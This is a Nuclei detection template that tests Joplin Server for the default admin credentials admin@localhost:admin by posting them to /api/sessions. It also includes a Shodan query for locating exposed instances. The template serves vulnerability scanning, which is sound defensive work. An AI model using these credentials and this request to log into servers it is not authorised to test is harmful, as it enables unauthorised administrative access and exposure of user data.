http:
- matchers:
  - condition: and
    dsl:
    - status_code == 200
    - contains_all(body,"user_id","id")
    - contains(content_type,"application/json")
    type: dsl
  raw:
  - "POST /api/sessions HTTP/1.1\nHost: {{Hostname}}\nContent-Type: application/json\n\
    \n{\n  \"email\": \"{{username}}\",\n  \"password\": \"{{password}}\"\n}\n"
id: joplin-default-login
info:
  author: pussycat0x
  description: 'Joplin Server installations are vulnerable to default administrative
    credentials. The system ships with a default admin account using the credentials
    admin@localhost:admin. Attackers can leverage these default credentials to gain
    administrative access to the Joplin Server instance, potentially compromising
    sensitive user data and system functionality.

    '
  metadata:
    max-request: 1
    shodan-query: title:"Joplin Server"
    verified: true
  name: Joplin - Default Login
  severity: high
  tags: joplin,oss,default-login,vuln
variables:
  password: admin
  username: admin@localhost
